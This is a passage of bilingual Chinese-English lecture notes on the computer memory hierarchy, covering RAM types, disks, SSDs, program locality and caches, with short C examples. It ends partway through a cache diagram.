<p>\u968f\u673a\u8bbf\u95ee\u5b58\u50a8\u5668\uff08RAM, random-access memory\uff09</p> <p>\u200b   \u5173\u952e\u7279\u6027 Key features</p> <p>\u200b       \u4e00\u822c\u88ab\u6253\u5305\u6210\u82af\u7247\u6837\u5f0f RAM is traditionally packaged as a chip</p> <p>\u200b       \u57fa\u672c\u7684\u5b58\u50a8\u5355\u4f4d\u79f0\u4e3a\u5355\u5143\uff08cell\uff09\uff0c\u4e00\u4e2a\u5355\u5143\u5b58\u50a8\u4e00\u4e2a\u6bd4\u7279 Basic storage unit is normally a cell (one bit per cell)</p> <p>\u200b       \u591a\u4e2a RAM \u6784\u6210\u4e00\u4e2a\u5185\u5b58 Multiple RAM chips form a memory</p> <p>\u200b   RAM \u5206\u4e3a\u4e24\u79cd RAM comes in two varieties:</p> <p>\u200b       SRAM (Static RAM)</p> <p>\u200b       DRAM (Dynamic RAM)</p> <p>\uff08SRAM \u548c DRAM \u662f\u6839\u636e\u5b58\u50a8\u5355\u5143\u5b9e\u73b0\u65b9\u5f0f\u6765\u533a\u5206\u7684\uff09</p> <p>SRAM \u548c DRAM \u5f02\u540c\u6bd4\u8f83\u603b\u7ed3</p> Trans. per bit Access time Needs refresh? Needs EDC? Cost Applications SRAM 4 or 6 1X No Maybe 100X Cache memories DRAM 1 10X Yes Yes 1X Main memories, frame buffers <p>\u6ce8\uff1a</p> <ol> <li> <p>\u6b64\u5904 trans. \u5373 transistor\uff08\u6676\u4f53\u7ba1\uff09\u3002</p> </li> <li> <p>\u9700\u8981\u5237\u65b0\uff1a\u5982\u679c\u9700\u8981\u5237\u65b0\uff08\u5b9a\u65f6\u5c06\u6570\u636e\u8bfb\u51fa\u5e76\u5199\u56de\uff09\uff0c\u90a3\u4e48\u9700\u8981\u4e00\u5b9a\u7684\u7535\u538b\u5145\u7535\uff0c\u5426\u5219\u5c31\u4f1a\u4e22\u5931\u7535\u8377\u8fdb\u800c\u4e22\u5931\u6240\u4fdd\u5b58\u7684\u4fe1\u606f\uff0c\u6362\u53e5\u8bdd\u8bf4 DRAM \u9700\u8981\u63d2\u7535\u4f7f\u7528\u3002</p> </li> <li>EDC: error detection  &amp; correction \u9519\u8bef\u68c0\u6d4b\u548c\u7ea0\u6b63</li> <li>cost\uff1a\u6210\u672c</li> <li>cache memories\uff1a\u9ad8\u901f\u7f13\u5b58\uff0c\u5185\u5b58\u5bb9\u91cf\u5c0f\u4f46\u901f\u5ea6\u975e\u5e38\u5feb\u7684\u82af\u7247</li> <li>main memories\uff1a\u4e3b\u5b58\uff1bframe buffers\uff1a\uff08\u56fe\u5f62\u663e\u5361\u4e2d\u7684\uff09\u5e27\u7f13\u5b58</li> </ol> <p>\u975e\u6613\u5931\u6027\u5b58\u50a8\u5668 Nonvolatile Memories</p> <p>\u200b   DRAM \u548c SRAM \u90fd\u662f\u6613\u5931\u6027\u5b58\u50a8\u5668 DRAM and SRAM are volatile memories</p> <p>\u200b       \u5982\u679c\u65ad\u7535\u5c31\u4f1a\u4e22\u6389\u4fe1\u606f Lose information if powered off</p> <p>\u200b   \u975e\u6613\u5931\u6027\u5b58\u50a8\u5668\u65ad\u7535\u540e\u4fe1\u606f\u8fd8\u80fd\u4fdd\u5b58 Nonvolatile memories retain value even if powered off</p> <p>\u200b       ROM \u53ea\u8bfb\u5185\u5b58\uff1a\u5728\u751f\u4ea7\u65f6\u88ab\u786c\u7f16\u7801\u4e00\u6b21 Read-only memory (ROM): programmed during production</p> <p>\u200b       Programmable ROM (PROM): can be programmed once</p> <p>\u200b       Erasable PROM (EPROM): can be bulk erased (UV, X-ray)</p> <p>\u200b       Electrically erasable PROM (EEPROM): electronic erase capability</p> <p>\u200b       \u95ea\u5b58 Flash memory: EEPROMs. with partial (block-level) erase capability </p> <p>\u200b           Wears out after about 100,000 erasings</p> <p>\u200b   Uses for Nonvolatile Memories</p> <p>\u200b       \u56fa\u4ef6\u7a0b\u5e8f\u5b58\u50a8\u5728 ROM \u4e2d Firmware programs stored in a ROM (BIOS, controllers for disks), network cards, graphic accelerators, security subsystems\uff08BIOS\uff1aBasic Input/Output System\uff09</p> <p>\u200b       \u56fa\u6001\u786c\u76d8\uff08SSD, solid state disk\uff09Solid state disks (replace rotating disks in thumb drives, smart phones, mp3 players, tablets, laptops, ...)</p> <p>\u200b       Disk caches.</p> <p>\u4f20\u7edf\u7684\u603b\u7ebf\u7ed3\u6784\u8fde\u63a5 CPU \u548c\u5185\u5b58 Trditional Bus Structure Connecting CPU and Memory</p> <p>\u200b   A bus is a collection of parallel wires that carry address, data, and control signals.</p> <p>\u200b   Buses are typically shared by multiple devices.</p> <pre><code>          System bus               Memory bus\nCPU chip &lt;----------&gt; I/O bridege &lt;----------&gt; main memory\n\nCPU ship:\n  Bus interface &lt;-&gt; Register file &lt;-&gt; ALU\n    ^\n    | \n    --&gt; I/O bridge\n</code></pre> <p>Memory Read Transaction</p> <p>\u200b   <code>movq A, %rax</code></p> <p>\u200b   (1) CPU places address A on the memory bus. (from bus interface to main memory)</p> <p>\u200b   (2) Main memory reads A from the memory bus, retrieves word x, and places it on the bus (from main memory to bus interface)</p> <p>\u200b   (3) CPU read word x from the bus and copies it into register %rax (from bus interface to register file)</p> <p>Memory Write Transaction</p> <p>\u200b   <code>movq %rax, A</code></p> <p>\u200b   (1)  CPU places address A on the memory bus. Main memory reads it and waits for the corresponding data word to arrive. (from bus interface to main memory)</p> <p>\u200b   (2) CPU places data word y on the bus. (from register file to main memory)</p> <p>\u200b   (3) main memory reads data word y from the bus and stores it at address A.</p> <p>What's Inside A Disk Drive?</p> <p></p> <p>platters\uff1a\u76d8\u7247\uff0c\u6bcf\u4e2a\u76d8\u7247\u90fd\u6d82\u6709\u78c1\u6027\u6750\u6599\uff0c\u7136\u540e\u5728\u8be5\u78c1\u6027\u6750\u6599\u4e2d\u7f16\u7801\u4e8c\u8fdb\u5236\u4f4d\u3002</p> <p>arm\uff1a\u4f20\u52a8\u81c2\uff0c\u94f0\u63a5\u5728\u786c\u76d8\u4e0a\uff0c\u5b83\u6f02\u6d6e\u5728\u76d8\u7247\u4e0a\u65b9\u7684\u8584\u8584\u4e00\u5c42\u7a7a\u6c14\u4e2d\u3002\u4f20\u52a8\u81c2\u6700\u672b\u7aef\u6709\u4e00\u4e2a\u8bfb/\u5199\u5934\uff0c\u53ef\u4ee5\u611f\u77e5\u7f16\u7801\u4f4d\u7684\u78c1\u573a\u53d8\u5316\u3002\u76d8\u7247\u9006\u65f6\u9488\u65cb\u8f6c\uff0c\u78c1\u81c2\u53ef\u4ee5\u524d\u540e\u79fb\u52a8\u3002\u8fd9\u79cd\u673a\u68b0\u7ed3\u6784\u800c\u975e\u7535\u78c1\u7ed3\u6784\u8bf4\u660e\u786c\u76d8\u6bd4 DRAM \u548c SRAM \u6162\u3002</p> <p>Disk Geometry</p> <p>\u200b   Disks consist of platters, each with two surfaces.</p> <p>\u200b   Each surfaces consists of concentric rings\uff08\u540c\u5fc3\u5706\uff09 called tracks\uff08\u78c1\u9053\uff09.</p> <p>\u200b   Each track consists of sectors\uff08\u6247\u533a\uff09 separated by gaps\uff08\u7a7a\u9699\uff09. \uff08\u4e00\u822c\u4e00\u4e2a\u6247\u533a\u5b58\u50a8 512 \u4e2a\u5b57\u8282\uff09</p> <p>\u200b   \u76d8\u7247\u5728\u4e3b\u8f74\uff08spindle\uff09\u4e0a\u662f\u5f7c\u6b64\u5bf9\u9f50\u7684\uff0c\u6545\u800c\u5728\u4e0d\u540c\u8868\u9762\u4e0a\uff0c\u8f68\u9053\u4e5f\u662f\u5bf9\u9f50\u7684\u3002\u8fd9\u4e9b\u8f68\u9053\u7684\u96c6\u5408\u79f0\u4e3a\u4e00\u4e2a\u67f1\u9762\uff08cylinder\uff09</p> <p>Disk Capacity</p> <p>\u200b   Capacity: maximum number of bits that be stored</p> <p>\u200b       Vendors express capacity in units of gigabytes (GB), where 1 GB = 10^9 Bytes not 1GB = 2^20 Bytes.</p> <p>\u200b   Capacity is determined by these technology factors:</p> <p>\u200b       \u8bb0\u5f55\u5bc6\u5ea6 Recording density (bits/in): number of bits that can be squeezed into a 1 inch segment of a track.</p> <p>\u200b       \u78c1\u9053\u5bc6\u5ea6 Track density (tracks/in): number of tracks that can be squeezed into a 1 inch radial segment.</p> <p>\u200b       \u9762\u5bc6\u5ea6 Areal density (bits/in2): product of recording and track density. \u9762\u5bc6\u5ea6\u8d8a\u9ad8\u3002\u4e00\u4e2a\u78c1\u9762\u4e0a\u5c31\u80fd\u5b58\u50a8\u66f4\u591a\u6bd4\u7279\u3002</p> <p>Recording Zones</p> <p>\u200b   Modern disks partition tracks into disjoint subsets called recording zones.</p> <p>\u200b       Each track in a zone has the same number of sectors, determined by the circumference of innermost track.</p> <p>\u200b       Each zone has a different number of sectors/track, outer zones have more sectors/track than inner zones.</p> <p>\u200b       So, we use average number of sectors/track when computing capacity.</p> <p>Computing Disk Capacity</p> <p>\u200b   Capacity = (# bytes/sector) * (avg. # sectois/track) * (# tracks/surface) * (# surface/platter) * (# platters/disk)</p> <p>Disk Operation (Single-Platter View) (18:39)</p> <p>\u200b   The disk surface spins at a fixed rotational rate\uff0c\u73b0\u5728\uff082015 \u5e74\uff09\u5178\u578b\u7684\u901f\u7387\u53ef\u80fd\u662f 7200r/min.</p> <p>\u200b   The read/write head is attached to the end of the arm and flies over the disk surface on a thin cushion of air.</p> <p>\u200b   By moving rapidly, the arm can position the read/write head over any track.</p> <p>Disk Operation (Multi-Platter View) (19:23)</p> <p>Disk Structure - top view of single platter (20:35)</p> <p>\u200b   Data transfer -&gt; Seek -&gt; Rotational latency -&gt; Data transfer -&gt; ...</p> <p>\u200b   \u5148\u5f84\u5411\u79fb\u52a8\uff0c\u518d\u65cb\u8f6c\u76d8\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u5982\u4e0a\u6240\u8ff0\u6709\u4e09\u4e2a\u90e8\u5206\u3002</p> <p>\u200b   \u7b2c\u4e00\u90e8\u5206\uff1a\u79fb\u52a8\u78c1\u5934 move the head\uff0c\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u79f0\u4e3a\u5bfb\u9053\u65f6\u95f4\uff08seek\uff09\u3002</p> <p>\u200b   \u7b2c\u4e8c\u90e8\u5206\uff1a\u65cb\u8f6c\u78c1\u76d8\uff0c\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u79f0\u4e3a\u65cb\u8f6c\u5ef6\u8fdf\uff08rotational latency\uff09\uff0c\u6b64\u65f6\u95f4\u901a\u5e38\u662f\u8f6c\u534a\u5708\u7684\u65f6\u95f4\uff0c\u5373\u65cb\u8f6c\u4e00\u6574\u5708\u7684\u65f6\u95f4\u7684\u4e00\u534a\u3002</p> <p>\u200b   \u7b2c\u4e09\u90e8\u5206\uff1a\u8f68\u9053\u5728\u8bfb/\u5199\u5934\u4e0b\u901a\u8fc7\u7684\u65f6\u95f4\uff0c\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u79f0\u4f5c\u4f20\u9001\u65f6\u95f4\uff08data transfer\uff09</p> <p>Disk Access Time</p> <p>\u200b   Average time to access some target sector approximated by:</p> <p>\u200b       T(access) = T(avg seek) + T(avg rotation) + T(avg transfer)</p> <p>\u200b   Seek time (T(avg seek))</p> <p>\u200b       Time to position heads over cyclinder containing target sector.</p> <p>\u200b       Typically T(avg seek) is 3-9 ms.</p> <p>\u200b   Rotational latency (T(avg rotation))</p> <p>\u200b       Time waiting for first bit of target sector to pass under r/w head.</p> <p>\u200b       T(avg rotation) = 1/2 *  1/RPMs * 60 sec/1 min</p> <p>\u200b       Typical T(avg rotation) = 7200 RPMs.</p> <p>\u200b   Transfer time (T(avg transfer))</p> <p>\u200b       Time to read the bits in the target sector</p> <p>\u200b       T(avg transfer) = 1/RPM * 1/(avg # sectors/track) * 60 secs/1 min</p> <p>\u200b   \u6ce8\uff1aRPM \u4e3a\u6bcf\u5206\u949f\u78c1\u76d8\u8f6c\u591a\u5c11\u5708 rounds per minute.</p> <p>Important points:</p> <p>\u200b   \u8bbf\u95ee\u65f6\u95f4\u4e3b\u8981\u53d6\u51b3\u4e8e\u5bfb\u9053\u65f6\u95f4\u548c\u65cb\u8f6c\u5ef6\u8fdf Access time dominated by seek time and rotational latency.</p> <p>\u200b   \u8fde\u7eed\u8bbf\u95ee\u65f6\uff0c\u8bbf\u95ee\u4e00\u4e2a\u6247\u533a\u7684\u7b2c\u4e00\u4e2a\u6bd4\u7279\u6700\u82b1\u8d39\u65f6\u95f4\uff0c\u540e\u9762\u7684\u65f6\u95f4\u90fd\u53ef\u4ee5\u5ffd\u7565\u4e0d\u8ba1 First bit in a sector is the most expensive, the rest are free.</p> <p>\u200b   SRAM access time is about 4 ns/doubleword, DRAM about 60 ns/doubleword.</p> <p>\u200b       Disk is about 40,000 times slower than SRAM, and 2,500 times slower than DRAM.</p> <p>Logical Disk Blocks</p> <p>\u200b   Modern disks present a simpler abstract view of the complex sector geometry:</p> <p>\u200b       \u73b0\u4ee3\u78c1\u76d8\u5c06\u78c1\u76d8\u4f5c\u4e3a\u4e00\u7cfb\u5217\u903b\u8f91\u5757\u63d0\u4f9b\u7ed9 CPU\uff0c\u6bcf\u4e2a\u5757\u662f\u6247\u533a\u5927\u5c0f\u7684\u6574\u6570\u500d\uff0c\u7f16\u53f7\u4ece 0 \u5f00\u59cb\u3002</p> <p>\u200b       The set of available sectors is modeled as a sequence of b-sized logical blocks (0, 1, 2, ...)</p> <p>\u200b   Mapping between logical blocks and actual (physical) sectors</p> <p>\u200b       \u78c1\u76d8\u63a7\u5236\u5668\uff08disk controller\uff09\u4fdd\u6301\u7269\u7406\u6247\u533a\u548c\u903b\u8f91\u5757\u4e4b\u95f4\u7684\u6620\u5c04\u3002</p> <p>\u200b       Maintained by hardware/firmware device called disk controller.</p> <p>\u200b       Converts requests for logical blocks into (surface, track, sector) triples. </p> <p>\u200b   Allows controller to set aside spare cylinders for each zone.</p> <p>\u200b       \u78c1\u76d8\u63a7\u5236\u5668\u5141\u8bb8\u5c06\u4e00\u4e9b\u67f1\u9762\u4fdd\u7559\u4e3a\u5907\u7528\u67f1\u9762\uff0c\u5176\u4e2d\u6ca1\u6709\u6620\u5c04\u5230\u4efb\u4f55\u4e00\u4e2a\u903b\u8f91\u5757\uff0c\u4e00\u65e6\u67d0\u4e2a\u4f7f\u7528\u7684\u67f1\u9762\u7684\u6247\u533a\u574f\u4e86\uff0c\u5219\u542f\u7528\u5907\u7528\u67f1\u9762\u3002\u8fd9\u5c31\u89e3\u91ca\u4e86\u4e3a\u4ec0\u4e48\u78c1\u76d8\u7684\u300c\u683c\u5f0f\u5bb9\u91cf\uff08formatted capacity\uff09\u300d\u6bd4\u5b9e\u9645\u5bb9\u91cf\uff08\u5982\u679c\u4f60\u53bb\u6570\u5b9e\u9645\u7684\u67f1\u9762\u6570\uff09\u8981\u5c0f\u3002</p> <p>\u200b       Accounts for the difference in \"formatted capacity\" and \"maximum capacity\".</p> <p>\u8f93\u5165\u8f93\u51fa\u603b\u7ebf I/O Bus (27:18)</p> <p>\u200b   \u6b64\u5904\u5c55\u793a\u7684\u662f\u4e94\u5e74\u524d\uff08\u4ee5 2015 \u5e74\u4e3a\u57fa\u51c6\uff09\u7684 PCI \u603b\u7ebf\uff08PCI bus\uff09\uff0c\u5176\u4e3a\u5e7f\u64ad\u603b\u7ebf\uff08broadcast bus\uff09\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c\u8be5\u603b\u7ebf\u76f4\u63a5\u8fde\u63a5\u7684\u90e8\u5206\u4e00\u65e6\u66f4\u6539\uff0c\u5176\u4f59\u90e8\u5206\u90fd\u53ef\u77e5\u9053\u8fd9\u4e00\u6539\u53d8\uff0c\u8fdb\u800c\u5176\u4e3a\u5355\u4e00\u7ebf\u8def\u3002</p> <p>\u200b   \u73b0\u4ee3\u7cfb\u7edf\u4f7f\u7528\u79f0\u4e3a PCIe\uff08PCI express\uff09\u7684\u603b\u7ebf\u7ed3\u6784\uff0c\u8be5\u7ed3\u6784\u662f\u70b9\u5bf9\u70b9\u7684\uff08point-to-point\uff09\uff0c\u5e76\u4e14\u70b9\u5bf9\u70b9\u4e4b\u95f4\u901a\u8fc7\u67d0\u79cd\u5f00\u5173\u4ef2\u88c1\uff0c\u663e\u7136\u5176\u4e3a\u4e00\u79cd\u66f4\u6709\u6548\u3001\u9ad8\u6548\u7684\u8bbe\u8ba1\u3002</p> <p></p> <p>Reading a Disk Sector</p> <p>\u200b   (1) CPU initiates a disk read by writing a command, logical block number, and destination memory address to a port (address) associated with disk controller.\uff08\u6b64\u5904\u5c55\u793a\u4e86\u8fd9\u6837\u7684\u4e09\u8981\u7d20\uff1a\u6307\u4ee4 command\u3001\u903b\u8f91\u5757\u53f7 logical block number\u3001\u5185\u5b58\u5730\u5740 destination memory address\uff09\u3010from bus interface to disk controller\u3011</p> <p>\u200b   (2) Disk controller reads the sector and performs a direct memory access (DMA) transfer into main memory. \u3010from disk to main memory\u3011</p> <p>\u200b   (3) When the DMA transfer conpletes, the disk controller notifies the CPU with an interrupt (i.e., asserts a special \"interrupt\" pin on the CPU) \u3010from disk controller to CPU chip\u3011</p> <p>\u200b   \u8fd9\u4e2a\u673a\u5236\u7684\u76ee\u7684\u5c06\u8bfb\u5199\u6253\u5305\uff0c\u8ba9\u6162\u901f\u7684\u78c1\u76d8\u8bfb\u5199\u80fd\u591f\u914d\u5408\u4e0a\u5feb\u901f\u7684\u6307\u4ee4\u5904\u7406\u3002</p> <p>Solid State Disks (SSDs) (31:56)</p> <p></p> <p>\u200b   \u56fa\u6001\u786c\u76d8\uff08SSD\uff09\u878d\u5408\u4e86\u65cb\u8f6c\u78c1\u76d8\u548c DRAM\uff0c\u4f5c\u4e3a\u5176\u4e2d\u95f4\u6001\uff0c\u8fd1\u5e74\u6765\uff082015 \u5e74\u89c6\u89d2\uff09\u53d7\u5230\u6b22\u8fce\u3002\u5728 CPU \u770b\u6765\uff0c\u56fa\u6001\u786c\u76d8\u548c\u65cb\u8f6c\u78c1\u76d8\u6709\u7740\u76f8\u540c\u7684\u7269\u7406\u63a5\u53e3\uff08physical interface\uff09\uff0c\u5177\u6709\u76f8\u540c\u7684\u5305\u88c5\uff0c\u4e8c\u8005\u5341\u5206\u76f8\u4f3c\u3002\u4f46\u5b9e\u9645\u4e0a\u56fa\u6001\u786c\u76d8\u6ca1\u6709\u90a3\u79cd\u673a\u68b0\u90e8\u4ef6\uff0c\u800c\u5b8c\u5168\u7531\u95ea\u5b58\uff08flash memory\uff09\u548c\u5145\u5f53\u63a7\u5236\u5668\u7684\u56fa\u4ef6\uff08firmware\uff09\u6784\u5efa\u3002</p> <p>\u30102020 \u5e74\u89c6\u89d2\uff1a\u4e3b\u673a\u548c PC \u90fd\u6709\u4e00\u5b9a\u7684\u76f4\u8bfb SSD \u529f\u80fd\u3011</p> <p>\u200b   \u5728\u56fa\u6001\u786c\u76d8\u5185\u90e8\u6709\u4e00\u7ec4\u56fa\u4ef6\uff0c\u79f0\u4e3a\u95ea\u5b58\u7ffb\u8bd1\u5c42\uff08the flash translation layer\uff09\uff0c\u5176\u4f5c\u7528\u4e0e\u65cb\u8f6c\u78c1\u76d8\u7684\u78c1\u76d8\u63a7\u5236\u5668\u76f8\u540c\u3002\u800c\u5185\u5b58\u672c\u8eab\uff0c\u53ef\u4ee5\u4ee5\u9875\uff08page\uff09\u4e3a\u5355\u4f4d\u4ece\u95ea\u5b58\u8bfb\u53d6\u548c\u5199\u5165\u6570\u636e\u3002\u9875\u7684\u5927\u5c0f\u6839\u636e\u5177\u4f53\u6280\u672f\u7684\u4e0d\u540c\uff0c\u4ece 512Bytes \u5230 4KB\uff08PPT \u4e0a\u7cfb\u7b14\u8bef\uff09\uff0c\u4e00\u7cfb\u5217\u7684\u9875\u5f62\u6210\u4e00\u4e2a\u5757\uff0c\u6839\u636e\u5177\u4f53\u6280\u672f\u4e0d\u540c\u4ece 32 \u9875\u5230 128 \u9875\uff0c\u6b64\u5904\u5757\u4e0e\u524d\u8ff0\u903b\u8f91\u5757\u4e0d\u540c\u3002</p> <p>\u200b   \u56fa\u6001\u786c\u76d8\u5bf9\u8bfb\u6ca1\u4ec0\u4e48\u9650\u5236\uff0c\u4f46\u662f\u5199\u5f88\u9ebb\u70e6\uff08\u5982 PPT\uff1aPage can be written only after its block has been erase\uff09\uff0c\u8fd9\u662f\u56e0\u4e3a\u5757\u5728\u7ecf\u8fc7\u4e00\u5b9a\u6570\u91cf\uff08\u5927\u6982\u5341\u4e07\u6b21\uff09\u91cd\u590d\u5199\u5165\u540e\u5c31\u4f1a\u78e8\u635f\u65e0\u6cd5\u518d\u8bfb\u5199\u4e86\u3002\u73b0\u4ee3\u6280\u672f\u7684\u95ea\u5b58\u7ffb\u8bd1\u5c42\u505a\u4e86\u5f88\u591a\u52aa\u529b\u548c\u4f7f\u7528\u4e86\u8bb8\u591a\u4e13\u6709\u7b97\u6cd5\u4ee5\u5ef6\u957f SSD \u7684\u4f7f\u7528\u751f\u547d\u3002</p> <p>\u56fa\u6001\u786c\u76d8\u7684\u6027\u80fd\u7279\u70b9 SSD Performance Characteristics</p> <p>\u200b   (source: Intel SSD 730 product specification)</p> <pre><code>Sequential read tput  550 MB/s\nRandom read tput      365 MB/s\nAvg seq read time      50 us\nSequential write tput 470 MB/s\nRandom write tput     303 MB/s\nAvg seq write time     60 us\n</code></pre> <p>Sequential access faster than random access</p> <p>\u200b   Common theme in the memory hierarchy</p> <p>Random writes are somewhat slower</p> <p>\u200b   Erasing a block takes a long time (~1 ms).</p> <p>\u200b   Modifying a block page requires all other pages to be copied to new block.</p> <p>\u200b   In earlier SSDs. the read/write gap was much larger.</p> <p>SSD Tradeoffs v.s. Rotating Disks</p> <p>\u200b   Advantages</p> <p>\u200b       \u6ca1\u6709\u79fb\u52a8\u90e8\u4ef6\u6240\u4ee5\u8bfb\u5199\u901f\u5ea6\u66f4\u5feb\uff0c\u8017\u7535\u66f4\u5c11\uff0c\u66f4\u7ed3\u5b9e No moving parts -&gt; faster, less, more rugged</p> <p>\u200b   Disadvantages</p> <p>\u200b       \u53ef\u80fd\u78e8\u635f Have the potential to wear out</p> <p>\u200b           Mitigated by \"wear leveling logic\" in flash translation layer</p> <p>\u200b           e.g. Intel SSD 730 guarantees 128 petabyte (here 1PB = 10^15 Bytes) of writes before they wear out</p> <p>\u200b       In 2015, about 30 times more expensive per byte.</p> <p>\u200b   Applications</p> <p>\u200b       MP3 players, smart phones, laptops</p> <p>\u200b       Beginning to appear om desktops and servers.</p> <p>The CPU-Memory Gap (37:42)</p> <p>\u200b   The gap widens between DRAM, disk, and CPU speeds.</p> <p>\u5c40\u90e8\u6027\u53d1\u6325\u5173\u952e\u4f5c\u7528 Locality to the Rescue</p> <p>\u200b   \u5f25\u5408 CPU \u548c\u5185\u5b58\u4e4b\u95f4\u5dee\u8ddd\u7684\u5173\u952e\u662f\u8fd9\u4e2a\u975e\u5e38\u6839\u672c\u7684\u7a0b\u5e8f\u7684\u57fa\u672c\u5c5e\u6027\u2014\u2014\u7a0b\u5e8f\u5c40\u90e8\u6027\u3002The key to bridging this CPU-Memory gap is a fundamental property of computer programs known as locality.</p> <p>\u200b   \u7a0b\u5e8f\u5c40\u90e8\u6027\uff1a\u7a0b\u5e8f\u503e\u5411\u4e8e\u4f7f\u7528\u5176\u5730\u5740\u63a5\u8fd1\u6216\u7b49\u4e8e\u6700\u8fd1\u4f7f\u7528\u8fc7\u7684\u6570\u636e\u548c\u6307\u4ee4\u7684\u90a3\u4e9b\u6570\u636e\u548c\u5730\u5740\u3002Principle of Locality: Programs tend to use data and instructions with addresses near or equal to those they have used recently.</p> <p>\u200b   \u65f6\u95f4\u5c40\u90e8\u6027\uff1a\u6700\u8fd1\u5f15\u7528\u7684\u5b58\u50a8\u5668\u4f4d\u7f6e\u53ef\u80fd\u518d\u4e0d\u4e45\u7684\u5c06\u6765\u518d\u6b21\u88ab\u5f15\u7528\u7684\u5c5e\u6027\u3002Temporal locality: Recently referenced items are likely to be referenced again in the near future.</p> <p>\u200b   \u7a7a\u95f4\u5c40\u90e8\u6027\uff1a\u5f15\u7528\u4e34\u8fd1\u5b58\u50a8\u5668\u4f4d\u7f6e\u7684\u503e\u5411\u3002Spatial locality: items with nearby addresses tend to be referenced close together in time. </p> <p>Locality Example</p> <pre><code>sum = 0;\nfor (i = 0; i &lt; n; i++)\n    sum += a[i];\nreturn sum;\n</code></pre> <p>\u200b   \u6570\u636e\u5f15\u7528 Data references</p> <p>\u200b       References array elements in succession (stride-1 reference pattern).\u3010\u7a7a\u95f4\u5c40\u90e8\u6027\u3011</p> <p>\u200b       Reference variable <code>sum</code> each iteration.\u3010\u65f6\u95f4\u5c40\u90e8\u6027\u3011</p> <p>\u200b   \u6307\u4ee4\u5f15\u7528 Instuction references</p> <p>\u200b       Reference instructions in sequence.\u3010\u7a7a\u95f4\u5c40\u90e8\u6027\u3011</p> <p>\u200b       Cycle through loop repeatedly.\u3010\u65f6\u95f4\u5c40\u90e8\u6027\u3011</p> <p>Qualitative Estimates of Locality</p> <p>\u200b   Claim: Being able to look at code and get a qualitative sense of its locality is a key skill for a professional programmer.</p> <p>\u200b   Question: Does this function have good locality with respect to array <code>a</code>.</p> <pre><code>int sum_array_rows(int a[M][N]) {\n    int i, j, sum = 0;\n    for (i = 0; i &lt; M; i++)\n        for (j = 0; j &lt; N; j++)\n            sum += a[i][j];\n   return sum;\n}\n</code></pre> <p>\u3010\u597d\u7684\u7a0b\u5e8f\u5c40\u90e8\u6027\u5e26\u6765\u826f\u597d\u7684\u6027\u80fd\uff0c\u62e5\u6709\u5bf9\u7a0b\u5e8f\u5c40\u90e8\u6027\u7684\u611f\u77e5\u662f\u7a0b\u5e8f\u5458\u7684\u4e00\u9879\u91cd\u8981\u6280\u80fd\u3011</p> <p>\u4e0d\u96be\u53d1\u73b0\u4e0a\u8ff0\u4ee3\u7801\u5bf9\u6570\u7ec4 <code>a</code> \u7684\u8bbf\u95ee\u662f\u8fde\u7eed\u7684\uff08\u8bb0\u4f4f\u4e8c\u7ef4\u6570\u7ec4\u4e5f\u662f\u884c\u4f18\u5148\u6392\u5217\u4e3a\u4e00\u5217\u6570\u636e\uff09\uff0c\u4e0b\u8ff0\u4ee3\u7801\u5219\u76f8\u5f53\u5dee\uff1a</p> <pre><code>int sum_array_cols(int a[M][N]) {\n    int i, j, sum = 0;\n    for (j = 0; j &lt; N; j++)\n        for (i = 0; i &lt; M; i++)\n            sum += a[i][j];\n   return sum;\n}\n</code></pre> <p>\u5b58\u50a8\u5668\u5c42\u6b21\u7ed3\u6784 Memory Hierarchies</p> <p>\u200b   Some fundamental and enduring properties of hardware and software</p> <p>\u200b       Fast storage technologies cost more per byte, have less capacity, and require more powerful (heat!).</p> <p>\u200b       The gap between CPU and main memory speed is widening.</p> <p>\u200b       Well-written programs tend to exhibit good locality.</p> <p>\u200b   These fundamental properties complement each other beautifully.</p> <p>\u200b   They suggest an approach for organizing memory and storage systems known as a memory hierarchy.</p> <pre><code>Smaller, faster, costlier storage devices\n^ L0: Registers // CPU registers hold words retrieved from the L1 cache.\n| L1: cache (SRAM) // L1 cache holds cache lines retrieved from the L2 cache.\n| L2: cache (SRAM) // L2 cache holds cache lines retrieved from the L3 cache.\n| L3: cache (SRAM) // L3 cache holds cache lines retrieved form main memory.\n| L4: main memory (DRAM) // Main memory holds disk blocks retrieved from local disks.\n| L5: local secondary storage (local disks)\nv L6: remote secondary storage (e.g. Web servers)\nLarger, slower, and cheaper storage devices \n</code></pre> <p>Caches </p> <p>\u200b   \u7f13\u5b58\uff1a\u4e00\u4e2a\u66f4\u5c0f\u7684\u3001\u66f4\u5feb\u7684\u5b58\u50a8\u8bbe\u5907\uff0c\u5145\u5f53\u66f4\u6162\u7684\u8bbe\u5907\u4e2d\u7684\u6570\u636e\u7684\u6682\u5b58\u533a\u57df\u3002Cache: A smaller, faster storage device that acts as a staging area for a subset of the data in a larger, slower device.</p> <p>\u200b   Fundamental idea of a memory hierarchy:</p> <p>\u200b       For each k, the faster, smaller device at level k serves as a cache for the larger, slower device at level k+1.</p> <p>\u200b   \u4e3a\u4ec0\u4e48\u5b58\u50a8\u5668\u5c42\u6b21\u7ed3\u6784\u6709\u7528 Why do memory hierarchies work?</p> <p>\u200b       \u56e0\u4e3a\u5c40\u90e8\u6027\uff0c\u76f8\u6bd4\u7b2c k+1 \u5c42\u7684\u6570\u636e\uff0c\u7a0b\u5e8f\u66f4\u503e\u5411\u4e8e\u8bbf\u95ee\u5b58\u50a8\u5728\u7b2c k \u5c42\u7684\u6570\u636e\u3002Because of locality, programs tend to access the data at level k more often than they access the data at level k+1.</p> <p>\u200b       \u56e0\u6b64\u6211\u4eec\u8bbf\u95ee\u7b2c k \u5c42\u7684\u8fd9\u4e9b\u6570\u636e\uff0c\u5c06\u4ee5\u7b2c k \u5c42\u8bbf\u95ee\u7684\u901f\u5ea6\u800c\u975e\u7b2c k+1 \u5c42\u8bbf\u95ee\u7684\u901f\u5ea6\u3002Thus, the storage at level k+1 can be slower, and thus larger and cheaper per bit.</p> <p>\u200b   Big Idea: The memory hierarchy creates a large pool of storage that costs as much as the cheap storage near the bottom, but that serves data to programs at the rate of fast storage near the top.</p> <p>\u901a\u7528\u7684\u7f13\u5b58\u7684\u6982\u5ff5 General Cache Concepts</p> <pre><code>-------------------------\n|  8  |  9  | 14  |  3  |  Cache \n-------------------------\n            ^\n            |\n            v\n-------------------------\n|  0  |  1  |  2  |  3  |  Memory\n-------------------------\n|  4  |  5  |  6  |  7  | \n-------------------------\n|  8  |  9  | 10  